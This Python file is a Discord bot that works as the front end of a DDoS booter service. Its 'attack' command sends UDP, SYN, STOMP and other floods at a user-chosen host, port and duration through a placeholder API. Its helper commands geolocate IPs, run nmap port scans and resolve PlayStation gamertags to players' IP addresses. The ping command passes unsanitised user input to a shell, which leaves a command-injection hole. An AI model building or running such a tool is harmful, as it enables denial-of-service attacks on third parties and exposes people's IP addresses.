import discord 
import time
import asyncio
import requests
import subprocess
from discord.ext import commands

client = discord.Client()
client = commands.Bot(command_prefix='.')
client.remove_command('help')

cooldown = []
methods = 'STD UDP TCP VSE STOMP ACK SYN'

async def CooldownReset():
    while True:
        await asyncio.sleep(180)
        cooldown.clear()

@client.event
async def on_ready():
    print(discord.__version__)
    print('logged in as')
    print(client.user.name)
    await CooldownReset()

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        embed=discord.Embed(title="``Unknown Command``", color=0xff00d0)
        embed.set_footer(text=f'Requested By {ctx.author}', icon_url=ctx.author.avatar_url)
        await ctx.send(embed=embed)
    if isinstance(error, commands.MissingRequiredArgument):
        embed=discord.Embed(title="``Missing Required Argument``", color=0xff00d0)
        embed.set_footer(text=f'Requested By {ctx.author}', icon_url=ctx.author.avatar_url)
        await ctx.send(embed=embed)
    if isinstance(error, commands.CheckFailure):
        embed=discord.Embed(title="``Missing permission``", color=0xff00d0)
        embed.set_footer(text=f'Requested By {ctx.author}', icon_url=ctx.author.avatar_url)
        await ctx.send(embed=embed)

@client.command()
async def help(ctx):
    embed = discord.Embed(color=0xff00d0)
    embed.add_field(name='__**DDoS Commands**__', value='''```
• attack         | Send An Attack To A Host        
• methods        | See A List Of Working Methods    ```''', inline=False)
    embed.add_field(name='__**Other Commands**__', value='''```
• geo            | Geo Lookup A Host               
• scan           | Scan An IP To Find Open Ports    
• ping           | Ping A Host To Check If Its Up   
• psn            | PSN Username Resolver           
• credits        | Shows The Bot Developers Credits```''', inline=False)
    embed.add_field(name='__**Usage**__', value='''```
• attack         | [METHOD] [HOST] [PORT] [TIME]
• methods        | [NO ARGUMENTS]
• geo            | [HOST]
• scan           | [HOST]
• ping           | [HOST]
• psn            | [USERNAME]
• credits        | [NO ARGUMENTS]```''', inline=False)
    embed.set_footer(text=f'Requested By {ctx.author}', icon_url=ctx.author.avatar_url)
    await ctx.send(embed=embed)

@client.command(name='attack')
async def AttackCommand(ctx, method, host, port, time):
    if ctx.author.id in cooldown:
        embed = discord.Embed(color=0xff00d0)
        embed.add_field(name='__**Attack**__', value='```You Are On The Cooldown List```', inline=False)
        embed.set_footer(text=f'Requested By {ctx.author}', icon_url=ctx.author.avatar_url)
        await ctx.send(embed=embed)
    elif not method in methods:
        embed = discord.Embed(color=0xff00d0)
        embed.add_field(name='__**Attack**__', value='```Invalid Method```', inline=False)
        embed.set_footer(text=f'Requested By {ctx.author}', icon_url=ctx.author.avatar_url)
        await ctx.send(embed=embed)
    elif not port.isdigit():
        embed = discord.Embed(color=0xff00d0)
        embed.add_field(name='__**Attack**__', value='```Invalid Port```', inline=False)
        embed.set_footer(text=f'Requested By {ctx.author}', icon_url=ctx.author.avatar_url)
        await ctx.send(embed=embed)
    elif not time.isdigit():
        embed = discord.Embed(color=0xff00d0)
        embed.add_field(name='__**Attack**__', value='```Invalid Time```', inline=False)
        embed.set_footer(text=f'Requested By {ctx.author}', icon_url=ctx.author.avatar_url)
        await ctx.send(embed=embed)
    elif int(time) > 180:
        embed = discord.Embed(color=0xff00d0)
        embed.add_field(name='__**Attack**__', value='```Maximum Time Reached! Max Time Is 180```', inline=False)
        embed.set_footer(text=f'Requested By {ctx.author}', icon_url=ctx.author.avatar_url)
        await ctx.send(embed=embed)
    else:
        requests.post(f'Your API')
        embed = discord.Embed(color=0xff00d0)
        embed.add_field(name='__**Attack**__', value=f'```Sent Attack To {host} For {time} On Port {port}```', inline=False)
        embed.set_footer(text=f'Requested By {ctx.author}', icon_url=ctx.author.avatar_url)
        await ctx.send(embed=embed)
        cooldown.append(ctx.author.id)

@client.command(name='methods')
async def MethodsCommand(ctx):
    embed = discord.Embed(color=0xff00d0)
    embed.add_field(name='__**Methods**__', value=f'```• STD\n• UDP\n• TCP\n• VSE\n• STOMP\n• ACK\n• SYN```', inline=False)
    embed.set_footer(text=f'Requested By {ctx.author}', icon_url=ctx.author.avatar_url)
    await ctx.send(embed=embed)

@client.command(name='geo')
async def GeoLookupCommand(ctx, ip):
    r = requests.get(f'https://json.geoiplookup.io/{ip}')
    ISP = r.json()['isp']
    Country = r.json()['country_name']
    City = r.json()['city']
    Continent = r.json()['continent_name']
    Region = r.json()['region']
    embed = discord.Embed(color=0xff00d0)
    embed.add_field(name='__**Geo Lookup**__', value=f'```• IP: {ip}\n• ISP: {ISP}\n• City: {City}\n• Country: {Country}\n• Continent: {Continent}\n• Region: {Region}\n```', inline=False)
    embed.set_footer(text=f'Requested By {ctx.author}', icon_url=ctx.author.avatar_url)
    await ctx.send(embed=embed)

@client.command(name='scan')
async def ScanCommand(ctx, ip):
    scanyuh = requests.get(f"https://api.hackertarget.com/nmap/?q={ip}")
    result = scanyuh.text.strip(" ( https://nmap.org/ )")
    embed = discord.Embed(color=0xff00d0)
    embed.add_field(name='__**NMAP Scan**__', value=f'```{result}```', inline=False)
    embed.set_footer(text=f'Requested By {ctx.author}', icon_url=ctx.author.avatar_url)
    await ctx.send(embed=embed)

@client.command(name='psn')
async def PsnCommand(ctx, user):
    r = requests.get(f"https://api.playstationresolver.xyz/?TYPE=RESOLVE_PSN&GAMERTAG={user}")
    if "That Gamertag Does Not Exist In Our Database" in r.text:
        embed = discord.Embed(color=0xff00d0)
        embed.add_field(name='__**PSN Lookup**__', value=f'```That Gamertag Does Not Exist In Our Database```', inline=False)
        embed.set_footer(text=f'Requested By {ctx.author}', icon_url=ctx.author.avatar_url)
        await ctx.send(embed=embed)
    else:
        IP = r.text.split('IP Address : ')[1].split('<br>')[0]
        Region = r.text.split('Account Region : ')[1].split('<br>')[0]
        embed = discord.Embed(color=0xff00d0)
        embed.add_field(name='__**PSN Lookup**__', value=f'```• IP: {IP}\n• Region: {Region}```', inline=False)
        embed.set_footer(text=f'Requested By {ctx.author}', icon_url=ctx.author.avatar_url)
        await ctx.send(embed=embed)

@client.command(name='ping')
async def PingCommand(ctx, ip):
    pingR = subprocess.getoutput(f"ping {ip} -4")
    pingP = pingR.split("\n")
    embed = discord.Embed(color=0xff00d0)
    embed.add_field(name='__**Ping**__', value=f'```{pingP[3]}\n{pingP[4]}\n{pingP[5]}\n{pingP[6]}```', inline=False)
    embed.set_footer(text=f'Requested By {ctx.author}', icon_url=ctx.author.avatar_url)
    await ctx.send(embed=embed)

@client.command(name='credits')
async def CreditsCommand(ctx):
    embed = discord.Embed(color=0xff00d0)
    embed.add_field(name='__**Credits**__', value=f'```• Main Developer                 | Dropout\n• Secondary Bot Developer        | Abby```', inline=False)
    embed.set_footer(text=f'Requested By {ctx.author}', icon_url=ctx.author.avatar_url)
    await ctx.send(embed=embed)

client.run('')
